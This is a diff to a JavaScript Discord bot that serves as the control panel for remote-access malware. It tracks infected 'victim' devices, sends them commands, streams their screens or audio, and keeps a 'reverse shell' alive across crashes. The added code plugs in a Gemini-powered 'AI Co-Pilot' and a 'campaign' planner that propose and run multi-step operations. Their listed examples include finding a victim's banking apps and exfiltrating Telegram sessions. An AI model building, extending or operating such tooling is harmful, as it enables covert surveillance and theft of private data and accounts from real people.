@@ -16,6 +16,9 @@ try {
 import { ICONS } from './icons.js'
 import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
 import { videoStream } from './stream.js'
+import { aiCoPilot } from './ai-copilot/index.js'
+import { aiContext } from './ai-copilot/context.js'
+import { campaignManager } from './ai-copilot/campaign.js'
 const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -159,7 +162,7 @@ const COMMAND_LOG_MAX = 50
 
 // Video stream manager (imported from stream.js)
 const COMMAND_COOLDOWN = 2000
-let statusCheckerId = null
+const statusCheckers = new Map()
 let cleanupIntervalId = null
 let startupMsgSent = false
 const alertCooldown = new Map()
@@ -279,6 +282,21 @@ async function sendCmdLogged(channel, cmd, payload, userId, userName) {
   const result = await sendCmd(channel, cmd, payload)
   if (result.ok) logCommand(userId, userName, cmd, payload, channel.name)
   return result
+}
+
+async function collectChannelResponse(channel, cmdName, timeoutMs = 20000) {
+  try {
+    const msgs = await channel.messages.fetch({ limit: 5 })
+    const response = msgs.find(m => m.author.bot && m.content && !m.content.includes(':heartbeat:') && (m.content.includes(`!${cmdName}`) || m.content.includes(`**${cmdName}`)))
+    if (response) return response.content.slice(0, 500)
+    // Wait for up to timeoutMs for a response
+    const collected = await new Promise((resolve) => {
+      const filter = (m) => m.author.bot && m.channel.id === channel.id && !m.content.includes(':heartbeat:')
+      const collector = channel.createMessageCollector({ filter, time: timeoutMs, max: 3 })
+      collector.on('end', (collected) => resolve(collected.first()?.content?.slice(0, 500) || null))
+    })
+    return collected
+  } catch { return null }
 }
 
 async function sendToTarget(uid, guild, cmd, payload) {
@@ -509,20 +527,8 @@ client.on(Events.InteractionCreate, async (i) => {
           return
         }
         case 'untarget': {
-          await guild.channels.fetch()
-          const phantomChannels = getPhantomChannels(guild)
-          const channelCount = phantomChannels.size
-          const targetCount = targets.size
-
-          targets.clear()
-
-          if (channelCount > 0) {
-            for (const [, ch] of phantomChannels) {
-              try { await ch.delete() } catch (_) {}
-            }
-          }
-
-          return i.editReply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} Cleared ${targetCount} target(s) + deleted ${channelCount} victim channel(s). List is clean. ${E.skull}`), components: MENU_BTNS })
+          const hadTarget = targets.delete(uid)
+          return i.editReply({ ...bloodEmbed(bold('TARGET CLEARED'), 'warning', `${E.coffin} ${hadTarget ? 'Target released.' : 'No target was set.'} ${E.skull}`), components: MENU_BTNS })
         }
         case 'broadcast': {
           const bc = options.getString('command').trim()
@@ -727,7 +733,7 @@ client.on(Events.InteractionCreate, async (i) => {
             else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
           }
 
-          const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
+          const botUrl = process.env.BOT_HTTP_URL
           const textChannelId = i.channelId
           const deviceId = deviceCh.name.replace('phantom-', '')
 
@@ -745,9 +751,15 @@ client.on(Events.InteractionCreate, async (i) => {
 
             if (started) {
               const payload = `voice ${voiceChannel.id} ${guild.id} ${textChannelId} ${botUrl}`
-              console.log(`[VoiceStream] Bot joined VC, sending command to ${deviceCh.name}`)
-              sendCmdLogged(deviceCh, 'stream', payload, uid, user.username).catch(() => {})
-              await i.editReply({ content: `${E.check} **Bot joined voice channel!**\nVoice: \`${voiceChannel.name}\`\nStream: <#${textChannelId}>\nDevice should start sending frames...` })
+              console.log(`[VoiceStream] Bot joined VC, sending command to ${deviceCh.name}: !stream ${payload}`)
+              const sendResult = await sendCmdLogged(deviceCh, 'stream', payload, uid, user.username)
+              if (sendResult.ok) {
+                console.log(`[VoiceStream] Payload sent successfully to ${deviceCh.name}`)
+                await i.editReply({ content: `${E.check} **Bot joined voice channel!**\nVoice: \`${voiceChannel.name}\`\nStream: <#${textChannelId}>\nPayload sent to device: \`!stream ${payload}\`` })
+              } else {
+                console.error(`[VoiceStream] Payload send FAILED: ${sendResult.err}`)
+                await i.editReply({ content: `${E.check} **Bot joined voice channel!**\nVoice: \`${voiceChannel.name}\`\n${E.warning} **Failed to send payload to device:** ${sendResult.err}` })
+              }
             } else {
               await i.editReply({ content: `${E.coffin} Failed to join voice channel ${E.skull}` })
             }
@@ -759,14 +771,19 @@ client.on(Events.InteractionCreate, async (i) => {
           return
         }
         case 'streamstop': {
-          const status = videoStream.getStreamStatus()
-          if (!status || status.streams.length === 0) {
-            return i.editReply(`${E.warning} No active streams to stop ${E.skull}`)
+          const uid = i.user.id
+          let deviceId = null
+          if (targets.has(uid)) {
+            const data = targets.get(uid)
+            const chId = typeof data === 'object' ? data.chId : data
+            const ch = i.guild.channels.cache.get(chId)
+            if (ch) deviceId = ch.name.replace('phantom-', '')
           }
-          for (const s of status.streams) {
-            videoStream.stopStream(s.deviceId)
+          if (!deviceId) {
+            return i.editReply(`${E.warning} No target selected. Use \`/target\` first ${E.skull}`)
           }
-          return i.editReply({ content: `${E.check} **Stream stopped!**\nBot left voice channel.`, components: MENU_BTNS })
+          videoStream.stopStream(deviceId)
+          return i.editReply({ content: `${E.check} **Stream stopped for \`${deviceId}\`**\nBot left voice channel.`, components: MENU_BTNS })
         }
         case 'streamstatus': {
           const status = videoStream.getStreamStatus()
@@ -810,9 +827,9 @@ client.on(Events.InteractionCreate, async (i) => {
     // ── Select menu ──
     if (i.customId === 'sel') {
       const ch = guild.channels.cache.get(i.values?.[0])
-      if (!ch) return i.editReply({ content: `${E.coffin} Not found ${E.skull}`, components: [] }).catch(() => {})
+      if (!ch) return i.update({ content: `${E.coffin} Not found ${E.skull}`, components: [] }).catch(() => {})
       targets.set(uid, { chId: ch.id, ts: Date.now() })
-      return i.editReply({ content: `${E.knife} **Victim:** ${ch.name}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
+      return i.update({ content: `${E.knife} **Victim:** ${ch.name}`, components: RESULT_BTNS }).catch(() => {})
     }
 
     // ── Select menu pagination ──
@@ -820,7 +837,7 @@ client.on(Events.InteractionCreate, async (i) => {
       const d = devicePages.get(i.message.id)
       if (!d) return i.followUp({ content: `${E.coffin} Session expired — use !target to refresh ${E.skull}`, ephemeral: true }).catch(() => {})
       d.idx = i.customId === 'sel_prev' ? Math.max(0, d.idx - 1) : Math.min(d.pages.length - 1, d.idx + 1)
-      await i.editReply({ components: d.pages[d.idx].components }).catch(() => {})
+      await i.update({ components: d.pages[d.idx].components }).catch(() => {})
       return
     }
 
@@ -872,15 +889,18 @@ client.on(Events.InteractionCreate, async (i) => {
     if (i.customId === 'target') {
       await guild.channels.fetch().catch(() => {})
       const channels = getPhantomChannels(guild)
-      if (!channels.size) return i.editReply({ content: `${E.coffin} No victims ${E.skull}` }).catch(() => {})
-      if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.editReply({ content: `${E.knife} Target: ${channels.first().name} ${E.skull}`, components: RESULT_BTNS }).catch(() => {}) }
+      if (!channels.size) return i.followUp({ content: `${E.coffin} No victims ${E.skull}`, ephemeral: true }).catch(() => {})
+      if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.followUp({ content: `${E.knife} Target: ${channels.first().name} ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {}) }
       const pages = devSelectPages(channels)
-      if (!pages.length) return i.editReply({ content: `${E.warning} Use \`!target <name>\` ${E.skull}` }).catch(() => {})
-      const reply = await i.editReply({ content: `Select victim ${E.knife}`, components: pages[0].components }).catch(() => {})
-      if (!reply) return
-      if (pages.length > 1) {
-        devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
-        setTimeout(() => devicePages.delete(reply.id), SELECT_TIMEOUT)
+      if (!pages.length) return i.followUp({ content: `${E.warning} Use \`!target <name>\` ${E.skull}`, ephemeral: true }).catch(() => {})
+      try {
+        const reply = await i.followUp({ content: `Select victim ${E.knife}`, components: pages[0].components, ephemeral: true, fetchReply: true })
+        if (pages.length > 1) {
+          devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
+          setTimeout(() => devicePages.delete(reply.id), SELECT_TIMEOUT)
+        }
+      } catch (_) {
+        await i.followUp({ content: `${E.coffin} Failed to show selector ${E.skull}`, ephemeral: true }).catch(() => {})
       }
       return
     }
@@ -922,6 +942,120 @@ client.on(Events.InteractionCreate, async (i) => {
       return
     }
 
+    // ── AI Co-Pilot buttons ──
+    if (i.customId.startsWith('ai_approve_') || i.customId.startsWith('ai_reject_')) {
+      const parts = i.customId.split('_')
+      const action = parts[1]
+      const targetUid = parts.slice(2).join('_')
+      if (i.user.id !== targetUid) return i.reply({ content: `${E.warning} Only the requester can approve/reject`, ephemeral: true }).catch(() => {})
+      const session = aiContext.getSession(guild.id, targetUid)
+      if (!session || !session.pendingProposal) return i.update({ content: `${E.coffin} Session expired ${E.skull}`, components: [] }).catch(() => {})
+      if (action === 'reject') {
+        aiContext.clearPendingProposal(session)
+        aiContext.addToHistory(session, 'system', 'Operator rejected the proposal')
+        return i.update({ content: `${E.coffin} Proposal rejected ${E.skull}`, components: [] }).catch(() => {})
+      }
+      const proposal = session.pendingProposal
+      aiContext.clearPendingProposal(session)
+      await i.update({ content: `${E.heart} AI Co-Pilot executing ${proposal.proposedCommands.length} command(s)...`, components: [] }).catch(() => {})
+      const results = []
+      for (const pc of proposal.proposedCommands) {
+        const cmdName = pc.command.replace(/^!/, '')
+        if (cmdName === 'target') {
+          await guild.channels.fetch()
+          const ch = findPhantomChannel(guild, pc.args)
+          if (ch) { targets.set(i.user.id, { chId: ch.id, ts: Date.now() }); session.currentTarget = ch.id; aiContext.updateDeviceKnowledge(session, ch.id, 'model', ch.name); results.push(`[TARGET] Set target to ${ch.name}`) }
+          else { results.push(`[TARGET FAIL] Device "${pc.args}" not found`) }
+          continue
+        }
+        const targetData = targets.get(i.user.id)
+        if (!targetData) { results.push(`[SKIP ${pc.command}] No target selected.`); continue }
+        const chId = typeof targetData === 'object' ? targetData.chId : targetData
+        const ch = guild.channels.cache.get(chId)
+        if (!ch) { results.push(`[SKIP ${pc.command}] Target channel gone`); continue }
+        const r = await sendCmdLogged(ch, cmdName, pc.args || '', i.user.id, i.user.username)
+        if (r.ok) {
+          results.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\` → ${ch.name}`)
+          const response = await collectChannelResponse(ch, cmdName, 20000)
+          if (response) { results.push(`[RESULT] ${response}`); aiContext.updateDeviceKnowledge(session, ch.id, `last_${cmdName}`, response) }
+        } else { results.push(`[FAIL] \`${pc.command}\`: ${r.err}`) }
+      }
+      const resultText = results.join('\n')
+      aiContext.addToHistory(session, 'system', `Commands executed:\n${resultText}`)
+      const followUp = await aiCoPilot.processResults(guild.id, i.user.id, resultText)
+      if (followUp.response.ready && followUp.response.summary) {
+        const nextBtns = followUp.response.proposedCommands?.length
+          ? actionRow(btn(`ai_approve_${i.user.id}`, 'EXECUTE NEXT', '▶️', 'success'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger'))
+          : MENU_BTNS
+        return i.editReply({ ...bloodEmbed(bold('🤖 AI CO-PILOT REPORT'), 'info', `**✅ COMMANDS EXECUTED**\n\`\`\`${resultText.slice(0, 1500)}\`\`\`\n\n**🤖 ANALYSIS**\n${followUp.response.summary}`), components: nextBtns }).catch(() => {})
+      }
+      const cmdList = followUp.response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
+      const proposalText = followUp.response.analysis
+        ? `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Analysis:** ${followUp.response.analysis}\n\n**Next Commands:**\n${cmdList}`
+        : `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Next Commands:**\n${cmdList}`
+      aiContext.setPendingProposal(session, followUp.response)
+      return i.editReply({ ...bloodEmbed(bold('🤖 AI CO-PILOT'), 'warning', proposalText), components: actionRow(btn(`ai_approve_${i.user.id}`, 'APPROVE NEXT', '✅', 'success'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger')) }).catch(() => {})
+    }
+
+    // ── Campaign buttons ──
+    if (i.customId.startsWith('cmp_')) {
+      const parts = i.customId.split('_')
+      const action = parts[1] // approve | plan | reject
+      const targetUid = parts[2]
+      const campaignId = parts.slice(3).join('_')
+      if (i.user.id !== targetUid) return i.reply({ content: `${E.warning} Only the requester can act on campaigns`, ephemeral: true }).catch(() => {})
+      const campaign = campaignManager.getCampaign(guild.id, targetUid, campaignId)
+      if (!campaign || campaign.status === 'aborted') return i.update({ content: `${E.coffin} Campaign not found or cancelled ${E.skull}`, components: [] }).catch(() => {})
+
+      if (action === 'reject') {
+        campaignManager.cancelCampaign(guild.id, targetUid, campaignId)
+        return i.update({ content: `${E.coffin} Campaign rejected ${E.skull}`, components: [] }).catch(() => {})
+      }
+
+      if (action === 'plan') {
+        return i.update({ content: `${E.tools} Manual planning not yet implemented — use APPROVE to run the AI plan ${E.skull}`, components: [] }).catch(() => {})
+      }
+
+      // APPROVE — execute campaign
+      await i.update({ content: `${E.heart} Campaign \`${campaignId}\` approved — executing...`, components: [] }).catch(() => {})
+
+      try {
+        const resultTexts = []
+        while (campaign.status !== 'completed' && campaign.status !== 'failed' && campaign.status !== 'aborted') {
+          const result = await campaignManager.executePhase(campaign, guild, client)
+          resultTexts.push(`[${result.phase || '?'}] ${result.status}: ${result.message || ''}`)
+
+          // Update message every few phases
+          if (campaign.currentPhaseIndex % 2 === 0 || result.status === 'completed' || result.status === 'failed') {
+            const progress = `${'█'.repeat(campaign.currentPhaseIndex)}${'░'.repeat(Math.max(0, campaign.phases.length - campaign.currentPhaseIndex))}`
+            await i.editReply({
+              content: `${E.heart} Campaign \`${campaignId}\`\n\`\`\`${progress}\`\`\`${campaign.progress} | ${campaign.elapsed}\n${resultTexts.slice(-3).join('\n')}`,
+            }).catch(() => {})
+          }
+
+          if (result.status === 'failed' || result.status === 'aborted') break
+        }
+
+        // Generate final report
+        const report = await campaignManager.generateReport(campaign)
+        const findings = report.keyFindings?.map(f => `• ${f}`).join('\n') || 'No findings'
+        const recommendations = report.recommendations?.map(r => `• ${r}`).join('\n') || 'None'
+        const collectedSummary = report.dataCollected
+          ? Object.entries(report.dataCollected).map(([k, v]) => `• ${k}: ${v}`).join('\n')
+          : 'See raw data'
+
+        const reportText = `**📊 CAMPAIGN COMPLETE**\n\n**Objective:** ${campaign.objective}\n**Duration:** ${campaign.elapsed}\n**Phases:** ${campaign.currentPhaseIndex}/${campaign.phases.length}\n\n**🔑 Key Findings:**\n${findings}\n\n**📁 Data Collected:**\n${collectedSummary}\n\n**💡 Recommendations:**\n${recommendations}`
+
+        return i.editReply({
+          ...bloodEmbed(bold(`🤖 ${report.title || 'CAMPAIGN REPORT'}`), 'info', reportText),
+          components: MENU_BTNS,
+        }).catch(() => {})
+      } catch (err) {
+        console.error('[Campaign] Execution error:', err)
+        return i.editReply({ content: `${E.coffin} Campaign error: ${err.message} ${E.skull}`, components: MENU_BTNS }).catch(() => {})
+      }
+    }
+
     return i.followUp({ content: `${E.skull} Unknown action ${E.skull}`, ephemeral: true }).catch(() => {})
   } catch (err) {
     console.error('Interaction error:', err.message, err.stack)
@@ -935,7 +1069,20 @@ client.on(Events.InteractionCreate, async (i) => {
   }
 })
 
-// ── Messages ────────────────────────────────────────────────────────────────
+// ── Heartbeat watcher (real-time status updates) ────────────────────────────
+
+client.on(Events.MessageCreate, (msg) => {
+  if (msg.author.bot && msg.channel.name?.startsWith('phantom-')) {
+    const content = msg.content || ''
+    if (content.includes(':heartbeat:') || content.includes('**Alive**') ||
+        content.includes('**Device Online**') || content.includes('**Reconnected**') ||
+        content.includes(':green_circle:')) {
+      deviceStatus.set(msg.channel.id, { online: true, lastSeen: msg.createdTimestamp, name: msg.channel.name })
+    }
+  }
+})
+
+// ── Commands ────────────────────────────────────────────────────────────────
 
 client.on(Events.MessageCreate, async (msg) => {
   if (msg.author.bot) return
@@ -997,20 +1144,8 @@ client.on(Events.MessageCreate, async (msg) => {
           return msg.reply({ ...bloodEmbed(bold('VICTIM ACQUIRED'), 'warning', `\`\`\`ansi\n${box}\n\`\`\``), components: RESULT_BTNS })
         }
         case '!untarget': {
-          await guild.channels.fetch()
-          const phantomChannels = getPhantomChannels(guild)
-          const channelCount = phantomChannels.size
-          const targetCount = targets.size
-
-          targets.clear()
-
-          if (channelCount > 0) {
-            for (const [, ch] of phantomChannels) {
-              try { await ch.delete() } catch (_) {}
-            }
-          }
-
-          return msg.reply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} Cleared ${targetCount} target(s) + deleted ${channelCount} victim channel(s). List is clean. ${E.skull}`), components: MENU_BTNS })
+          const hadTarget = targets.delete(uid)
+          return msg.reply({ ...bloodEmbed(bold('TARGET CLEARED'), 'warning', `${E.coffin} ${hadTarget ? 'Target released.' : 'No target was set.'} ${E.skull}`), components: MENU_BTNS })
         }
         case '!history': {
           const log = formatCommandLog(uid)
@@ -1127,6 +1262,81 @@ client.on(Events.MessageCreate, async (msg) => {
           if (!r.ok) return msg.reply(`${E.coffin} Error: ${r.err} ${E.skull}`)
           return msg.reply({ content: `${E.knife} Stream command sent ${E.skull}`, components: RESULT_BTNS })
         }
+        case '!ai': {
+          if (!aiCoPilot.isAvailable) return msg.reply(`${E.coffin} AI Co-Pilot needs a free Google Gemini API key. Get one at https://aistudio.google.com/apikey and set \`GEMINI_API_KEY\` in .env ${E.skull}`)
+          const aiMsg = args.join(' ')
+          if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\`\nExamples:\n\`!ai profile the device\`\n\`!ai what banking apps does she have\`\n\`!ai grab all telegram sessions\`\n\`!ai check if this device is interesting\` ${E.skull}`)
+          await msg.channel.sendTyping()
+          try {
+            const { session, response } = await aiCoPilot.processRequest(guild.id, uid, aiMsg)
+            if (!response.proposedCommands.length && response.ready) {
+              return msg.reply({ ...bloodEmbed(bold('🤖 AI CO-PILOT'), 'info', response.summary || response.analysis), components: MENU_BTNS })
+            }
+            const cmdList = response.proposedCommands.map((c, i) =>
+              `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`
+            ).join('\n')
+            const proposalText = response.analysis
+              ? `**Analysis:** ${response.analysis}\n\n**Proposed Commands:**\n${cmdList}`
+              : `**Proposed Commands:**\n${cmdList}`
+            const aiBtns = actionRow(
+              btn(`ai_approve_${uid}`, 'APPROVE', '✅', 'success'),
+              btn(`ai_reject_${uid}`, 'REJECT', '❌', 'danger'),
+            )
+            return msg.reply({ ...bloodEmbed(bold('🤖 AI CO-PILOT'), 'warning', proposalText), components: aiBtns })
+          } catch (err) {
+            console.error('[AI Co-Pilot] Error:', err)
+            return msg.reply(`${E.coffin} AI Co-Pilot error: ${err.message} ${E.skull}`)
+          }
+        }
+        case '!campaign': {
+          if (!aiCoPilot.isAvailable) return msg.reply(`${E.coffin} AI Co-Pilot needs a free Gemini API key — get one at https://aistudio.google.com/apikey and set GEMINI_API_KEY in .env ${E.skull}`)
+          const campMsg = args.join(' ')
+          if (!campMsg) return msg.reply(`${E.target} Usage: \`!campaign <objective>\`\nExamples:\n\`!campaign profile device-3 — get all intel\`\n\`!campaign exfil telegram from device-7\`\n\`!campaign full recon on all devices and report\`\n\`!campaign status\` — list active campaigns\` ${E.skull}`)
+
+          if (campMsg === 'status') {
+            const campaigns = campaignManager.listCampaigns(guild.id, uid)
+            if (!campaigns.length) return msg.reply(`${E.coffin} No active campaigns ${E.skull}`)
+            const lines = campaigns.map(c =>
+              `**${c.id.slice(0, 16)}...** | ${c.status} | ${c.progress} | ${c.elapsed} | ${c.objective.slice(0, 40)}`
+            ).join('\n')
+            return msg.reply({ ...bloodEmbed(bold('ACTIVE CAMPAIGNS'), 'info', lines), components: MENU_BTNS })
+          }
+
+          if (campMsg.startsWith('cancel ')) {
+            const cid = campMsg.slice(7).trim()
+            if (campaignManager.cancelCampaign(guild.id, uid, cid)) {
+              return msg.reply(`${E.coffin} Campaign \`${cid}\` cancelled ${E.skull}`)
+            }
+            return msg.reply(`${E.warning} Campaign not found ${E.skull}`)
+          }
+
+          await msg.channel.sendTyping()
+          try {
+            const campaign = await campaignManager.createCampaign(guild.id, uid, campMsg)
+            const deviceContext = aiContext.summarizeDeviceKnowledge(aiContext.getSession(guild.id, uid))
+            const plan = await campaignManager.planCampaign(campaign, deviceContext)
+
+            const phaseList = plan.phases.map((p, i) =>
+              `**Phase ${i + 1}: ${p.name}** ${p.requiresApproval ? ' [⚠️ APPROVAL]' : ''}\n` +
+              p.commands.map(c => `  ┃ \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
+            ).join('\n')
+
+            const est = plan.estimatedDuration || 'unknown'
+            const risk = plan.riskLevel || 'medium'
+
+            const proposalText = `**🎯 Objective:** ${campMsg}\n\n**Analysis:** ${plan.analysis}\n\n**Plan:**\n${phaseList}\n\n**Estimated:** ${est} | **Risk:** ${risk.toUpperCase()}\n**Campaign ID:** \`${campaign.id}\``
+
+            const aiBtns = actionRow(
+              btn(`cmp_approve_${uid}_${campaign.id}`, 'APPROVE', '✅', 'success'),
+              btn(`cmp_plan_${uid}_${campaign.id}`, 'MODIFY', '✏️', 'primary'),
+              btn(`cmp_reject_${uid}_${campaign.id}`, 'REJECT', '❌', 'danger'),
+            )
+            return msg.reply({ ...bloodEmbed(bold('🤖 CAMPAIGN PLAN'), 'warning', proposalText), components: aiBtns })
+          } catch (err) {
+            console.error('[Campaign] Error:', err)
+            return msg.reply(`${E.coffin} Campaign error: ${err.message} ${E.skull}`)
+          }
+        }
       }
       return
     }
@@ -1207,13 +1417,14 @@ client.on(Events.MessageCreate, async (msg) => {
 
 // ── Status checker ──────────────────────────────────────────────────────────
 
-let checkerRunning = false
 let botStartTime = Date.now()
 const deviceCheckLocks = new Set()
+const guildCheckLocks = new Set()
 
 async function refreshDeviceStatus(guild, sendAlerts = false) {
-  if (checkerRunning) return
-  checkerRunning = true
+  const gid = guild.id
+  if (guildCheckLocks.has(gid)) return
+  guildCheckLocks.add(gid)
   try {
     const allChannels = await guild.channels.fetch()
     const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
@@ -1337,11 +1548,12 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
       }
     }))
   } catch (err) { console.error('Status:', err.message) }
-  finally { checkerRunning = false }
+  finally { guildCheckLocks.delete(guild.id) }
 }
 
 function startStatusChecker(guild) {
-  if (statusCheckerId) clearInterval(statusCheckerId)
+  const gid = guild.id
+  if (statusCheckers.has(gid)) clearInterval(statusCheckers.get(gid))
   let running = false
   const runCheck = async () => {
     if (running) return
@@ -1354,7 +1566,7 @@ function startStatusChecker(guild) {
     finally { running = false }
   }
   runCheck()
-  statusCheckerId = setInterval(runCheck, STATUS_CHECK_INTERVAL)
+  statusCheckers.set(gid, setInterval(runCheck, STATUS_CHECK_INTERVAL))
 }
 
 // ── Map cleanup (memory leak fix) ─────────────────────────────────────────
@@ -1477,9 +1689,10 @@ client.on(Events.GuildCreate, async (guild) => {
 })
 
 client.on(Events.GuildDelete, (guild) => {
-  if (statusCheckerId) {
-    clearInterval(statusCheckerId)
-    statusCheckerId = null
+  const gid = guild.id
+  if (statusCheckers.has(gid)) {
+    clearInterval(statusCheckers.get(gid))
+    statusCheckers.delete(gid)
   }
   for (const [, ch] of guild.channels.cache) {
     if (ch.name.startsWith('phantom-')) {
@@ -1490,14 +1703,15 @@ client.on(Events.GuildDelete, (guild) => {
       })
     }
   }
-  console.log(`[-] Left guild: ${guild.name} — cleaned up channels`)
+  console.log(`[-] Left guild: ${guild.name} — cleaned up`)
 })
 
 // ── Graceful shutdown ──────────────────────────────────────────────────────
 
 function shutdown() {
   console.log('[*] Shutting down...')
-  if (statusCheckerId) clearInterval(statusCheckerId)
+  for (const intervalId of statusCheckers.values()) clearInterval(intervalId)
+  statusCheckers.clear()
   if (cleanupIntervalId) clearInterval(cleanupIntervalId)
   client.destroy()
   process.exit(0)
@@ -1506,8 +1720,62 @@ function shutdown() {
 process.on('SIGINT', shutdown)
 process.on('SIGTERM', shutdown)
 process.on('exit', () => {
-  if (statusCheckerId) clearInterval(statusCheckerId)
+  for (const intervalId of statusCheckers.values()) clearInterval(intervalId)
+  statusCheckers.clear()
   if (cleanupIntervalId) clearInterval(cleanupIntervalId)
+})
+
+// ── Crash Recovery (prevents lost reverse shell) ───────────────────────────
+
+process.on('uncaughtException', (err) => {
+  console.error('[FATAL] Uncaught exception:', err.message)
+  console.error(err.stack)
+  try {
+    const alertCh = client.channels?.cache?.get(ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID)
+    if (alertCh) {
+      alertCh.send(`:warning: **Bot crashed** — Restarting...\n\`${err.message.slice(0, 200)}\``).catch(() => {})
+    }
+  } catch (_) {}
+  // Don't exit - let Discord.js handle reconnection
+})
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('[FATAL] Unhandled rejection:', reason)
+  // Don't exit - Discord.js will recover
+})
+
+// ── Discord Gateway Recovery ───────────────────────────────────────────────
+
+client.on(Events.Warn, (info) => {
+  console.log(`[Gateway] Warn: ${info}`)
+})
+
+client.on(Events.Error, (error) => {
+  console.error(`[Gateway] Error: ${error.message}`)
+})
+
+client.on(Events.Raw, (raw) => {
+  // Log raw gateway events for debugging
+  if (raw.t === 'READY' || raw.t === 'RESUMED') {
+    console.log(`[Gateway] ${raw.t} — Connection restored`)
+  }
+})
+
+// Auto-reconnect on disconnect
+client.on(Events.ShardDisconnect, (event) => {
+  console.log(`[Gateway] Shard disconnected: ${event.code} ${event.reason || ''}`)
+})
+
+client.on(Events.ShardReconnecting, () => {
+  console.log('[Gateway] Shard reconnecting...')
+})
+
+client.on(Events.ShardResume, (replayed) => {
+  console.log(`[Gateway] Shard resumed — replayed ${replayed} events`)
+})
+
+client.on(Events.ShardReady, (shardId, unavailableGuilds) => {
+  console.log(`[Gateway] Shard ${shardId} ready`)
 })
 
 cleanupMapsInterval()
